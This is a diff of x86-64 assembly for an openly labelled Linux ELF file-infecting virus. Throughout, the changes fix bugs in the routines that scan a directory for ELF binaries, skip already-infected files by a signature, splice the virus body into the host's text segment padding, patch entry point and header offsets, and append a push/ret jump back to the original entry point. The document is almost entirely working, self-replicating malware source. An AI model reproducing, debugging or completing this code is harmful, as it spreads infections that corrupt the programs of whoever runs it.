@@ -168,30 +168,30 @@ section	.bss
 ;		.st_mtime		resq	1	;timeoflastfilemod
 ;		.st_ctime		resq	1	;timeoflastfilestatuschange
 ;	endstruc
-
-	struc elf_ehdr
-		.e_ident		resd	1		;unsignedchar
-		.ei_class		resb	1		;
-		.ei_data		resb	1		;
-		.ei_version		resb	1		;
-		.ei_osabi		resb	1		;
-		.ei_abiversion	resb	1		;
-		.ei_padding		resb	6		;bytes9-14
-		.ei_nident		resb	1		;sizeofidentarray
-		.e_type			resw	1		;uint16_t,bytes16-17
-		.e_machine		resw	1		;uint16_t,bytes18-19
-		.e_version		resd	1		;uint32_t, bytes 20-23
-		.e_entry		resq	1		;ElfN_Addr, bytes 24-31
-		.e_phoff		resq	1		;ElfN_Off, bytes 32-39
-		.e_shoff		resq	1		;ElfN_Off, bytes 40-47
-		.e_flags		resd	1		;uint32_t, bytes 48-51
-		.e_ehsize		resb	2		;uint16_t, bytes 52-53
-		.e_phentsize	resb	2		;uint16_t, bytes 54-55
-		.e_phnum		resb	2		;uint16_t, bytes 56-57
-		.e_shentsize	resb	2		;uint16_t, bytes 58-59
-		.e_shnum		resb	2		;uint16_t, bytes 60-61
-		.e_shstrndx		resb	2		;uint16_t, bytes 62-63
-	endstruc
+;
+;	struc elf_ehdr
+;		.e_ident		resd	1		;unsignedchar
+;		.ei_class		resb	1		;
+;		.ei_data		resb	1		;
+;		.ei_version		resb	1		;
+;		.ei_osabi		resb	1		;
+;		.ei_abiversion	resb	1		;
+;		.ei_padding		resb	6		;bytes9-14
+;		.ei_nident		resb	1		;sizeofidentarray
+;		.e_type			resw	1		;uint16_t,bytes16-17
+;		.e_machine		resw	1		;uint16_t,bytes18-19
+;		.e_version		resd	1		;uint32_t, bytes 20-23
+;		.e_entry		resq	1		;ElfN_Addr, bytes 24-31
+;		.e_phoff		resq	1		;ElfN_Off, bytes 32-39
+;		.e_shoff		resq	1		;ElfN_Off, bytes 40-47
+;		.e_flags		resd	1		;uint32_t, bytes 48-51
+;		.e_ehsize		resb	2		;uint16_t, bytes 52-53
+;		.e_phentsize	resb	2		;uint16_t, bytes 54-55
+;		.e_phnum		resb	2		;uint16_t, bytes 56-57
+;		.e_shentsize	resb	2		;uint16_t, bytes 58-59
+;		.e_shnum		resb	2		;uint16_t, bytes 60-61
+;		.e_shstrndx		resb	2		;uint16_t, bytes 62-63
+;	endstruc
 
 	struc elf_phdr
 		.p_type			resd 1		;  uint32_t   
@@ -246,8 +246,8 @@ section	.bss
 ; instructions for returning to original host ELF entry point
 ; after conclusion of vx routines; appended to end of vx body
 ; r14 + 150 = push (0x68)
-; r14 + 152 = dword XXXX 		address of original host entry point
-; r14 + 156 = ret (0xc3)
+; r14 + 151 = dword XXXX 		address of original host entry point
+; r14 + 155 = ret (0xc3)
 
 ;
 ; r14 + 200 = local filename (saved from dirent.d_nameq)
@@ -386,17 +386,19 @@ PAGESIZE dd 4096
 evaddr: dq 0
 
 ;original section header offset
-oshoff: dd 0
+oshoff: dq 0
 
 hostentry_offset: dd 0
 hosttext_start: dd 0
 
 data_offset_new_padding: dd 0
-data_offset_original: dd 0
+data_offset_og: dd 0
+data_offset_original: dq 0
 data_offset_padding_size: dd 0
 
 vxhostentry: dq 0
 vxoffset: dd 0
+vxdatasegment: dd 0
 vxshoff: dd 0
 ventry equ $_start 
 
@@ -565,6 +567,9 @@ check_file:
 	push rcx
 	;nvm d_type might not be available; use the macros for fstat instead
 	check_elf:
+
+		lea r12, [rcx + r14 + 618]
+		mov [r14 + 160], r12
 		;lea rdi, [rcx + r14 + 600 + linuxdirent.d_nameq]	;name of file in rdi
 		lea rdi, [rcx + r14 + 618]	;linuxdirent entry filename in rdi
 		mov rsi, OPEN_RDWR 					;flags - read/write in rsi
@@ -582,13 +587,16 @@ check_file:
 		
 		xor r12, r12
 		lea rdi, [r14 + 200] 
-		lea rsi, [rcx + r14 + 618]		;linuxdirent.d_nameq
+		mov rsi, [r14 + 160]	
+		;lea rsi, [rcx + r14 + 618]		;linuxdirent.d_nameq
 		.copy_filename:
 			movsb
 			inc r12
 			cmp byte [rsi], 0x0
 			jne .copy_filename
 		
+		mov r13, [r14 + 160]		;linuxdirent.d_nameq
+		call _write
 		xor rax, rax
 		push r9
 	check_filename:
@@ -700,12 +708,14 @@ check_file:
 		;call _write
 		
 	verifie_pas_de_vx_sig:
-		lea r13, [rax + elf_ehdr.e_entry]
+		;lea r13, [rax + elf_ehdr.e_entry]
+		lea r13, [rax + 24]
 		cmp dword [r13 + 2], 0x786f786f
 		je checknext
 	
 	verifie_deja_infecte:
-		cmp dword [rax + elf_ehdr.ei_padding], 0x786f786f
+		;cmp dword [rax + elf_ehdr.ei_padding], 0x786f786f
+		cmp dword [rax + 9], 0x786f786f
 		je checknext
 		;lea r13, pasinfectepass
 		;mov r12, pasinfectepasslen
@@ -785,7 +795,8 @@ payload:
 	mov rdi, STDOUT
 	syscall
 	
-	jmp _restore
+	;jmp _restore
+	jmp checknext
 
 ;****************************************************************************************
 ;	Infection routine:
@@ -872,8 +883,10 @@ infect:
 					mov r10, [r13 + r12 + elf_phdr.p_vaddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
 					add r10, [r13 + r12 + elf_phdr.p_filesz]
 					mov qword [evaddr], r10				;save evaddr
-					;add dword r10d, [ventry]				;new entry point of infected file = evaddr + ventry
-					mov dword [r13 + elf_ehdr.e_entry], r10d	; update ELF header entry point to point to virus code start
+					
+					add dword r10d, ventry				;new entry point of infected file = evaddr + ventry
+					;mov qword [r13 + elf_ehdr.e_entry], r10	; update ELF header entry point to point to virus code start
+					mov qword [r13 + 24], r10	; update ELF header entry point to point to virus code start
 					mov r10, [r13 + r12 + elf_phdr.p_offset] 
 					mov dword [hosttext_start], r10d
 					add r10, [r13 + r12 + elf_phdr.p_filesz]				
@@ -883,7 +896,8 @@ infect:
 					jmp .next_phdr				;this jmp might be unneccessary but adding it for testing	
 				.mod_phdr_data_segment:			
 					mov r11, [r13 + r12 + elf_phdr.p_offset]
-					mov dword [data_offset_original],  r11d
+					mov dword [data_offset_og],  r11d
+					mov qword [data_offset_original],  r11
 					add dword r11d, [PAGESIZE]
 					mov dword [r13 + r12 + elf_phdr.p_offset], r11d
 					mov dword [data_offset_new_padding],  r11d
@@ -897,7 +911,7 @@ infect:
 			.mod_subsequent_phdr:
 				xor r11, r11
 				mov r11, [r13 + r12 + elf_phdr.p_offset]
-				cmp dword r11d, vxoffset
+				cmp dword r11d, [vxoffset]
 				jl .next_phdr
 				add dword r11d, [PAGESIZE]
 				mov dword [r13 + r12 + elf_phdr.p_offset], r11d
@@ -924,11 +938,11 @@ infect:
 			jge .mod_subsequent_shdr
 			mov r11, [r13 + r15 + elf_shdr.sh_addr]
 			add dword r11d, [r13 + r15 + elf_shdr.sh_size]
-			cmp dword r11d, [vxoffset]
+			cmp dword r11d, vxoffset
 			jne .mod_subsequent_shdr
-			mov dword r10d, [r13 + r15 + elf_shdr.sh_size]
+			mov r10, [r13 + r15 + elf_shdr.sh_size]
 			add dword r10d, vlen
-			mov dword [r13 + r15 + elf_shdr.sh_size], r10d
+			mov [r13 + r15 + elf_shdr.sh_size], r10
 
 			.mod_subsequent_shdr:
 				mov r11, [r13 + r15 + elf_shdr.sh_offset]
@@ -940,14 +954,15 @@ infect:
 			add r15w, word [r13 + 58] 				; add elf_ehdr.e_shentsize to shdr offset in r15 
 			cmp cx, 0
 			jg .shdr_loop
-	mov r11, [r13 + elf_ehdr.e_shoff]
-	mov dword [oshoff], r11d
+	;mov r11, [r13 + elf_ehdr.e_shoff]
+	mov r11, [r13 + 40] 					;elf_ehdr.e_shoff
+	mov qword [oshoff], r11
 	cmp dword r11d, [vxoffset]
-	jg .patch_ehdr_shoff
+	jge .patch_ehdr_shoff
 	jmp fin_infect
 	.patch_ehdr_shoff:
 		add dword r11d, [PAGESIZE]
-		mov dword [r13 + elf_ehdr.e_shoff], r11d
+		mov qword [r13 + 40], r11 			;elf_ehdr.e_shoff
 		mov dword [vxshoff], r11d
 		jmp frankenstein_elf
 	
@@ -1018,7 +1033,8 @@ frankenstein_elf:
 		mov rdx, [PAGESIZE]
 	.write_host_ehdr_phdrs_textsegment:	
 		mov rdi, r9
-		lea rsi, [r13 + elf_ehdr]					;r13 contains pointer to mmap'd file
+		;lea rsi, [r13 + elf_ehdr]					;r13 contains pointer to mmap'd file
+		lea rsi, [r13]					;r13 contains pointer to mmap'd file
 		mov rax, SYS_WRITE
 		syscall
 	.write_virus_totemp:
@@ -1030,12 +1046,12 @@ frankenstein_elf:
 		syscall
 
 	.write_jmp_to_oep:
-		mov rdx, 8
+		mov rdx, 6
 		mov byte [r14 + 150], 0x68			;0x68 = push
-		mov dword [r14 + 152], r8d			;address of original host entry point
-		mov byte [r14 + 156], 0xc3			;0xc3 = ret
+		mov dword [r14 + 151], r8d			;address of original host entry point
+		mov byte [r14 + 155], 0xc3			;0xc3 = ret
 		lea rsi, [r14+ 150]
-		mov r10, qword [vxoffset]
+		mov r10d, dword [vxoffset]
 		add r10d, dword vlen				;file offset adjusted to vxoffset+vlen
 		mov rax, SYS_PWRITE64
 		syscall
@@ -1046,23 +1062,37 @@ frankenstein_elf:
 	;ftruncate grows the file with null bytes, so this will append nec. padding bytes
 	;before we write the original host data segment to the temp file
 	.write_padding_after_vx:
-		mov esi, dword [data_offset_new_padding]
+		;xor rsi, rsi
+		mov r10d, dword [vxoffset]
+		add r10d, dword vlen				;file offset adjusted to vxoffset+vlen
+		add r10d, dword [PAGESIZE]				;file offset adjusted to vxoffset+vlen
+		add r10d, 6							;add 6 bytes for push/ret original entrypoint
+		mov dword [vxdatasegment], r10d
+		mov esi, r10d
+		;mov rsi, qword [data_offset_new_padding]
 		mov rax, SYS_FTRUNCATE
 		syscall
 
 	.write_datasegment_totemp:
-		mov rdx, [oshoff]
-		sub edx, dword [vxoffset]
-		lea rsi, [r13 + elf_ehdr]				;r13 contains pointer to mmap'd file
+		mov rdx, qword [oshoff]
+		;mov rdx, qword [r14 + 48] 	;filestat.st_size
+		;sub edx, dword [vxoffset]
+		sub edx, dword [data_offset_og]
+		;sub edx, dword [data_offset_original]
+		;lea rsi, [r13 + elf_ehdr]				;r13 contains pointer to mmap'd file
+		lea rsi, [r13]				;r13 contains pointer to mmap'd file
 		add rsi, qword [data_offset_original]	;adjust rsi address to point to original data segment offset of mmap'd file
-		mov r10d, dword [data_offset_new_padding]
+		;add rsi, qword [evaddr]	;adjust rsi address to point to original data segment offset of mmap'd file
+		;mov r10d, dword [data_offset_new_padding]
+		;mov r10d, dword [vxdatasegment]
 		mov rax, SYS_PWRITE64
 		syscall
 
 	.write_patched_shdrs_totemp:
 		mov rdx, [r14 + 48] 	;filestat.st_size
 		sub edx, dword [oshoff]
-		lea rsi, [r13 + elf_ehdr]
+;		;lea rsi, [r13 + elf_ehdr]
+		lea rsi, [r13]
 		add rsi, qword [oshoff]
 		mov r10d, dword [vxshoff]
 		mov rax, SYS_PWRITE64
